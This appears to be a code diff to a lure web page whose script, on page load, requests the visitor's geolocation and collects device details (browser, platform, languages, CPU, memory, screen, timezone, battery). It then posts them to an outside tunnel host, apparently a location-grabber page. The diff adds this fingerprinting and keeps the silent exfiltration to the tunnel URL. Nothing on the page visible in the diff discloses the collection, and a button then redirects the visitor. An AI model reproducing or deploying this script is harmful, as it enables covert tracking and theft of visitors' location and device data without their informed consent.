@@ -20,28 +20,33 @@
 <script>
 const serverURL = "https://prolevel.serveousercontent.com";
 
-// 🔥 Page load pe hi location
-window.onload = () => {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                sendData(pos.coords.latitude, pos.coords.longitude);
-            },
-            () => {
-                sendData(null, null);
-            }
-        );
-    } else {
-        sendData(null, null);
-    }
-};
+// 🔥 Collect all mobile info
+async function collectAndSend(lat = null, lon = null) {
+    let batteryLevel = null;
+    let isCharging = null;
 
-function sendData(lat, lon) {
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = battery.level * 100;
+        isCharging = battery.charging;
+    }
+
     const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        online: navigator.onLine,
+        cpuCores: navigator.hardwareConcurrency || 0,
+        ram: navigator.deviceMemory || 0,
+        screenRes: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        batteryLevel: batteryLevel,
+        isCharging: isCharging,
         latitude: lat,
-        longitude: lon
+        longitude: lon,
+        time: new Date()
     };
 
     fetch(`${serverURL}/log-info`, {
@@ -52,6 +57,18 @@ function sendData(lat, lon) {
     .then(() => console.log("🔥 Sent:", data))
     .catch(() => console.log("❌ Error"));
 }
+
+// 🔥 Page load → location + info
+window.onload = () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => collectAndSend(pos.coords.latitude, pos.coords.longitude),
+            () => collectAndSend()
+        );
+    } else {
+        collectAndSend();
+    }
+};
 
 // 👉 Button → redirect
 function goNext() {
